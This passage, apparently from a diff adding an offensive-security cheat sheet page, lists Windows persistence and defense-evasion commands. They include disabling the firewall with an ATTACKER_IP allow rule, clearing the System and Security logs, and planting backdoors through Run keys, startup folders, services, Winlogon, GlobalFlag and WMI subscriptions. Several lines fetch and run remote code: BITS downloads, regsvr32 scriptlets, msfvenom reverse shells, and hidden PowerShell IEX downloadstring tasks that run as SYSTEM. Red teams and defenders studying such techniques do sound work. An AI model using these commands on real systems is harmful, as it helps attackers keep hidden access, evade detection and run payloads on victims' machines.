+  <a class="anchor" href="#disable-windows-firewall">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Netsh Advfirewall show allprofiles
+</span></span><span style="display:flex;"><span>NetSh Advfirewall set allprofiles state off
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ip whitelisting</span>
+</span></span><span style="display:flex;"><span>New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+</span></span></code></pre></div><h3 id="clear-system-and-security-logs">
+  Clear System and Security Logs
+  <a class="anchor" href="#clear-system-and-security-logs">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cmd.exe /c wevtutil.exe cl System
+</span></span><span style="display:flex;"><span>cmd.exe /c wevtutil.exe cl Security
+</span></span></code></pre></div><h2 id="simple-user">
+  Simple User
+  <a class="anchor" href="#simple-user">#</a>
+</h2>
+<p>Set a file as hidden</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>attrib +h c:\autoexec.bat
+</span></span></code></pre></div><h3 id="registry-hkcu">
+  Registry HKCU
+  <a class="anchor" href="#registry-hkcu">#</a>
+</h3>
+<p>Create a REG_SZ value in the Run key within HKCU\Software\Microsoft\Windows.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Value name<span style="color:#960050;background-color:#1e0010">:</span>  Backdoor
+</span></span><span style="display:flex;"><span>Value data<span style="color:#960050;background-color:#1e0010">:</span>  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
+</span></span></code></pre></div><p>Using the command line</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&#34;</span> /v Evil /t REG_SZ /d <span style="color:#e6db74">&#34;C:\Users\user\backdoor.exe&#34;</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&#34;</span> /v Evil /t REG_SZ /d <span style="color:#e6db74">&#34;C:\Users\user\backdoor.exe&#34;</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&#34;</span> /v Evil /t REG_SZ /d <span style="color:#e6db74">&#34;C:\Users\user\backdoor.exe&#34;</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&#34;</span> /v Evil /t REG_SZ /d <span style="color:#e6db74">&#34;C:\Users\user\backdoor.exe&#34;</span>
+</span></span></code></pre></div><p>Using SharPersist</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>SharPersist -t reg -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -k <span style="color:#e6db74">&#34;hkcurun&#34;</span> -v <span style="color:#e6db74">&#34;Test Stuff&#34;</span> -m add
+</span></span><span style="display:flex;"><span>SharPersist -t reg -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -k <span style="color:#e6db74">&#34;hkcurun&#34;</span> -v <span style="color:#e6db74">&#34;Test Stuff&#34;</span> -m add -o env
+</span></span><span style="display:flex;"><span>SharPersist -t reg -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -k <span style="color:#e6db74">&#34;logonscript&#34;</span> -m add
+</span></span></code></pre></div><h3 id="startup">
+  Startup
+  <a class="anchor" href="#startup">#</a>
+</h3>
+<p>Create a batch script in the user startup folder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
+</span></span><span style="display:flex;"><span>start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
+</span></span></code></pre></div><p>Using SharPersist</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>SharPersist -t startupfolder -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> <span style="color:#f92672">-f</span> <span style="color:#e6db74">&#34;Some File&#34;</span> -m add
+</span></span></code></pre></div><h3 id="scheduled-tasks-user">
+  Scheduled Tasks User
+  <a class="anchor" href="#scheduled-tasks-user">#</a>
+</h3>
+<ul>
+<li>
+<p>Using native <strong>schtask</strong> - Create a new task</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Create the scheduled tasks to run once at 00.00</span>
+</span></span><span style="display:flex;"><span>schtasks /create /sc ONCE /st <span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> /tn <span style="color:#e6db74">&#34;Device-Synchronize&#34;</span> /tr C:\Temp\revshell.exe
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Force run it now !</span>
+</span></span><span style="display:flex;"><span>schtasks /run /tn <span style="color:#e6db74">&#34;Device-Synchronize&#34;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>Using native <strong>schtask</strong> - Leverage the <code>schtasks /change</code> command to modify existing scheduled tasks</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Launch an executable by calling the ShellExec_RunDLL function.</span>
+</span></span><span style="display:flex;"><span>SCHTASKS /Change /tn <span style="color:#e6db74">&#34;\Microsoft\Windows\PLA\Server Manager Performance Monitor&#34;</span> /TR <span style="color:#e6db74">&#34;C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat&#34;</span> /RL HIGHEST /RU <span style="color:#e6db74">&#34;&#34;</span> /ENABLE
+</span></span></code></pre></div></li>
+<li>
+<p>Using Powershell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; $A = New-ScheduledTaskAction -Execute <span style="color:#e6db74">&#34;cmd.exe&#34;</span> -Argument <span style="color:#e6db74">&#34;/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe&#34;</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; $T = New-ScheduledTaskTrigger -AtLogOn -User <span style="color:#e6db74">&#34;Rasta&#34;</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; $P = New-ScheduledTaskPrincipal <span style="color:#e6db74">&#34;Rasta&#34;</span>
+</span></span><span style="display:flex;"><span>PS C:\&gt; $S = New-ScheduledTaskSettingsSet
+</span></span><span style="display:flex;"><span>PS C:\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
+</span></span><span style="display:flex;"><span>PS C:\&gt; Register-ScheduledTask Backdoor -InputObject $D
+</span></span></code></pre></div></li>
+<li>
+<p>Using SharPersist</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Add to a current scheduled task</span>
+</span></span><span style="display:flex;"><span>SharPersist -t schtaskbackdoor -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -n <span style="color:#e6db74">&#34;Something Cool&#34;</span> -m add
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add new task</span>
+</span></span><span style="display:flex;"><span>SharPersist -t schtask -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -n <span style="color:#e6db74">&#34;Some Task&#34;</span> -m add
+</span></span><span style="display:flex;"><span>SharPersist -t schtask -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -n <span style="color:#e6db74">&#34;Some Task&#34;</span> -m add -o hourly
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="bits-jobs">
+  BITS Jobs
+  <a class="anchor" href="#bits-jobs">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>bitsadmin /create backdoor
+</span></span><span style="display:flex;"><span>bitsadmin /addfile backdoor <span style="color:#e6db74">&#34;http://10.10.10.10/evil.exe&#34;</span>  <span style="color:#e6db74">&#34;C:\tmp\evil.exe&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># v1</span>
+</span></span><span style="display:flex;"><span>bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
+</span></span><span style="display:flex;"><span>bitsadmin /SetMinRetryDelay <span style="color:#e6db74">&#34;backdoor&#34;</span> <span style="color:#ae81ff">60</span>
+</span></span><span style="display:flex;"><span>bitsadmin /resume backdoor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># v2 - exploit/multi/script/web_delivery</span>
+</span></span><span style="display:flex;"><span>bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe <span style="color:#e6db74">&#34;/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll&#34;</span>
+</span></span><span style="display:flex;"><span>bitsadmin /resume backdoor
+</span></span></code></pre></div><h2 id="serviceland">
+  Serviceland
+  <a class="anchor" href="#serviceland">#</a>
+</h2>
+<h3 id="iis">
+  IIS
+  <a class="anchor" href="#iis">#</a>
+</h3>
+<p>IIS Raid – Backdooring IIS Using Native Modules</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/0x09AL/IIS-Raid
+</span></span><span style="display:flex;"><span>$ python iis_controller.py --url http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.168</span>.1.<span style="color:#ae81ff">11</span>/ --password SIMPLEPASS
+</span></span><span style="display:flex;"><span>C:\Windows\system32\inetsrv\APPCMD.EXE install module /name<span style="color:#960050;background-color:#1e0010">:</span>Module Name /image<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;%windir%\System32\inetsrv\IIS-Backdoor.dll&#34;</span> /add<span style="color:#960050;background-color:#1e0010">:</span>true
+</span></span></code></pre></div><h3 id="windows-service">
+  Windows Service
+  <a class="anchor" href="#windows-service">#</a>
+</h3>
+<p>Using SharPersist</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>SharPersist -t service -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c calc.exe&#34;</span> -n <span style="color:#e6db74">&#34;Some Service&#34;</span> -m add
+</span></span></code></pre></div><h2 id="elevated">
+  Elevated
+  <a class="anchor" href="#elevated">#</a>
+</h2>
+<h3 id="registry-hklm">
+  Registry HKLM
+  <a class="anchor" href="#registry-hklm">#</a>
+</h3>
+<p>Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\Software\Microsoft\Windows.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Value name<span style="color:#960050;background-color:#1e0010">:</span>  Backdoor
+</span></span><span style="display:flex;"><span>Value data<span style="color:#960050;background-color:#1e0010">:</span>  C:\Windows\Temp\backdoor.exe
+</span></span></code></pre></div><p>Using the command line</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&#34;</span> /v Evil /t REG_SZ /d <span style="color:#e6db74">&#34;C:\tmp\backdoor.exe&#34;</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&#34;</span> /v Evil /t REG_SZ /d <span style="color:#e6db74">&#34;C:\tmp\backdoor.exe&#34;</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&#34;</span> /v Evil /t REG_SZ /d <span style="color:#e6db74">&#34;C:\tmp\backdoor.exe&#34;</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&#34;</span> /v Evil /t REG_SZ /d <span style="color:#e6db74">&#34;C:\tmp\backdoor.exe&#34;</span>
+</span></span></code></pre></div><h4 id="winlogon-helper-dll">
+  Winlogon Helper DLL
+  <a class="anchor" href="#winlogon-helper-dll">#</a>
+</h4>
+<blockquote>
+<p>Run executable during Windows logon</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span style="color:#ae81ff">10.10</span>.10.10 LPORT=<span style="color:#ae81ff">4444</span> <span style="color:#f92672">-f</span> exe &gt; evilbinary.exe
+</span></span><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span style="color:#ae81ff">10.10</span>.10.10 LPORT=<span style="color:#ae81ff">4444</span> <span style="color:#f92672">-f</span> dll &gt; evilbinary.dll
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> /v Userinit /d <span style="color:#e6db74">&#34;Userinit.exe, evilbinary.exe&#34;</span> /f
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> /v Shell /d <span style="color:#e6db74">&#34;explorer.exe, evilbinary.exe&#34;</span> /f
+</span></span><span style="display:flex;"><span>Set-ItemProperty <span style="color:#e6db74">&#34;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&#34;</span> <span style="color:#e6db74">&#34;Userinit&#34;</span> <span style="color:#e6db74">&#34;Userinit.exe, evilbinary.exe&#34;</span> -Force
+</span></span><span style="display:flex;"><span>Set-ItemProperty <span style="color:#e6db74">&#34;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&#34;</span> <span style="color:#e6db74">&#34;Shell&#34;</span> <span style="color:#e6db74">&#34;explorer.exe, evilbinary.exe&#34;</span> -Force
+</span></span></code></pre></div><h4 id="globalflag">
+  GlobalFlag
+  <a class="anchor" href="#globalflag">#</a>
+</h4>
+<blockquote>
+<p>Run executable after notepad is killed</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&#34;</span> /v GlobalFlag /t REG_DWORD /d <span style="color:#ae81ff">512</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&#34;</span> /v ReportingMode /t REG_DWORD /d <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>reg add <span style="color:#e6db74">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&#34;</span> /v MonitorProcess /d <span style="color:#e6db74">&#34;C:\temp\evil.exe&#34;</span>
+</span></span></code></pre></div><h3 id="startup-elevated">
+  Startup Elevated
+  <a class="anchor" href="#startup-elevated">#</a>
+</h3>
+<p>Create a batch script in the user startup folder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 
+</span></span></code></pre></div><h3 id="services-elevated">
+  Services Elevated
+  <a class="anchor" href="#services-elevated">#</a>
+</h3>
+<p>Create a service that will start automatically or on-demand.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Powershell</span>
+</span></span><span style="display:flex;"><span>New-Service -Name <span style="color:#e6db74">&#34;Backdoor&#34;</span> -BinaryPathName <span style="color:#e6db74">&#34;C:\Windows\Temp\backdoor.exe&#34;</span> -Description <span style="color:#e6db74">&#34;Nothing to see here.&#34;</span> -StartupType Automatic
+</span></span><span style="display:flex;"><span>sc start pentestlab
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SharPersist</span>
+</span></span><span style="display:flex;"><span>SharPersist -t service -c <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style="color:#e6db74">&#34;/c backdoor.exe&#34;</span> -n <span style="color:#e6db74">&#34;Backdoor&#34;</span> -m add
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sc</span>
+</span></span><span style="display:flex;"><span>sc create Backdoor binpath= <span style="color:#e6db74">&#34;cmd.exe /k C:\temp\backdoor.exe&#34;</span> start=<span style="color:#e6db74">&#34;auto&#34;</span> obj=<span style="color:#e6db74">&#34;LocalSystem&#34;</span>
+</span></span><span style="display:flex;"><span>sc start Backdoor
+</span></span></code></pre></div><h3 id="scheduled-tasks-elevated">
+  Scheduled Tasks Elevated
+  <a class="anchor" href="#scheduled-tasks-elevated">#</a>
+</h3>
+<p>Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day.</p>
+<blockquote>
+<p>Processes spawned as scheduled tasks have taskeng.exe process as their parent</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Powershell</span>
+</span></span><span style="display:flex;"><span>$A = New-ScheduledTaskAction -Execute <span style="color:#e6db74">&#34;cmd.exe&#34;</span> -Argument <span style="color:#e6db74">&#34;/c C:\temp\backdoor.exe&#34;</span>
+</span></span><span style="display:flex;"><span>$T = New-ScheduledTaskTrigger -Daily -At 9am
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># OR</span>
+</span></span><span style="display:flex;"><span>$T = New-ScheduledTaskTrigger -Daily -At <span style="color:#e6db74">&#34;9/30/2020 11:05:00 AM&#34;</span>
+</span></span><span style="display:flex;"><span>$P = New-ScheduledTaskPrincipal <span style="color:#e6db74">&#34;NT AUTHORITY\SYSTEM&#34;</span> -RunLevel Highest
+</span></span><span style="display:flex;"><span>$S = New-ScheduledTaskSettingsSet
+</span></span><span style="display:flex;"><span>$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
+</span></span><span style="display:flex;"><span>Register-ScheduledTask <span style="color:#e6db74">&#34;Backdoor&#34;</span> -InputObject $D
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Native schtasks</span>
+</span></span><span style="display:flex;"><span>schtasks /create /sc minute /mo <span style="color:#ae81ff">1</span> /tn <span style="color:#e6db74">&#34;eviltask&#34;</span> /tr C:\tools\shell.cmd /ru <span style="color:#e6db74">&#34;SYSTEM&#34;</span>
+</span></span><span style="display:flex;"><span>schtasks /create /sc minute /mo <span style="color:#ae81ff">1</span> /tn <span style="color:#e6db74">&#34;eviltask&#34;</span> /tr calc /ru <span style="color:#e6db74">&#34;SYSTEM&#34;</span> /s dc-mantvydas /u user /p password
+</span></span><span style="display:flex;"><span>schtasks /Create /RU <span style="color:#e6db74">&#34;NT AUTHORITY\SYSTEM&#34;</span> /tn [<span style="color:#66d9ef">TaskName</span>] /tr <span style="color:#e6db74">&#34;regsvr32.exe -s \&#34;</span>C:\Users\*\AppData\Local\Temp\[<span style="color:#66d9ef">payload</span>].dll\<span style="color:#e6db74">&#34;&#34;</span> /SC ONCE /Z /ST [<span style="color:#66d9ef">Time</span>] /ET [<span style="color:#66d9ef">Time</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##(X86) - On User Login</span>
+</span></span><span style="display:flex;"><span>schtasks /create /tn OfficeUpdaterA /tr <span style="color:#e6db74">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.95.195:8080/kBBldxiub6&#39;&#39;&#39;))&#39;&#34;</span> /sc onlogon /ru System
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##(X86) - On System Start</span>
+</span></span><span style="display:flex;"><span>schtasks /create /tn OfficeUpdaterB /tr <span style="color:#e6db74">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.95.195:8080/kBBldxiub6&#39;&#39;&#39;))&#39;&#34;</span> /sc onstart /ru System
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##(X86) - On User Idle (30mins)</span>
+</span></span><span style="display:flex;"><span>schtasks /create /tn OfficeUpdaterC /tr <span style="color:#e6db74">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.95.195:8080/kBBldxiub6&#39;&#39;&#39;))&#39;&#34;</span> /sc onidle /i <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##(X64) - On User Login</span>
+</span></span><span style="display:flex;"><span>schtasks /create /tn OfficeUpdaterA /tr <span style="color:#e6db74">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.95.195:8080/kBBldxiub6&#39;&#39;&#39;))&#39;&#34;</span> /sc onlogon /ru System
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##(X64) - On System Start</span>
+</span></span><span style="display:flex;"><span>schtasks /create /tn OfficeUpdaterB /tr <span style="color:#e6db74">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.95.195:8080/kBBldxiub6&#39;&#39;&#39;))&#39;&#34;</span> /sc onstart /ru System
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##(X64) - On User Idle (30mins)</span>
+</span></span><span style="display:flex;"><span>schtasks /create /tn OfficeUpdaterC /tr <span style="color:#e6db74">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.95.195:8080/kBBldxiub6&#39;&#39;&#39;))&#39;&#34;</span> /sc onidle /i <span style="color:#ae81ff">30</span>
+</span></span></code></pre></div><h3 id="windows-management-instrumentation-event-subscription">
+  Windows Management Instrumentation Event Subscription
+  <a class="anchor" href="#windows-management-instrumentation-event-subscription">#</a>
+</h3>
+<blockquote>
+<p>An adversary can use Windows Management Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.</p>
+</blockquote>
+<ul>
+<li><strong>__EventFilter</strong>: Trigger (new process, failed logon etc.)</li>
+<li><strong>EventConsumer</strong>: Perform Action (execute payload etc.)</li>
+<li><strong>__FilterToConsumerBinding</strong>: Binds Filter and Consumer Classes</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Using CMD : Execute a binary 60 seconds after Windows started</span>
+</span></span><span style="display:flex;"><span>wmic /NAMESPACE<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;\\root\subscription&#34;</span> PATH __EventFilter CREATE Name=<span style="color:#e6db74">&#34;WMIPersist&#34;</span>, EventNameSpace=<span style="color:#e6db74">&#34;root\cimv2&#34;</span>,QueryLanguage=<span style="color:#e6db74">&#34;WQL&#34;</span>, Query=<span style="color:#e6db74">&#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>wmic /NAMESPACE<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;\\root\subscription&#34;</span> PATH CommandLineEventConsumer CREATE Name=<span style="color:#e6db74">&#34;WMIPersist&#34;</span>, ExecutablePath=<span style="color:#e6db74">&#34;C:\Windows\System32\binary.exe&#34;</span>,CommandLineTemplate=<span style="color:#e6db74">&#34;C:\Windows\System32\binary.exe&#34;</span>
+</span></span><span style="display:flex;"><span>wmic /NAMESPACE<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;\\root\subscription&#34;</span> PATH __FilterToConsumerBinding CREATE <span style="color:#66d9ef">Filter</span>=<span style="color:#e6db74">&#34;__EventFilter.Name=\&#34;</span>WMIPersist\<span style="color:#e6db74">&#34;&#34;</span>, Consumer=<span style="color:#e6db74">&#34;CommandLineEventConsumer.Name=\&#34;</span>WMIPersist\<span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove it</span>
+</span></span><span style="display:flex;"><span>Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter <span style="color:#e6db74">&#34;Name=&#39;WMIPersist&#39;&#34;</span> | Remove-WmiObject -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using Powershell (deploy)</span>
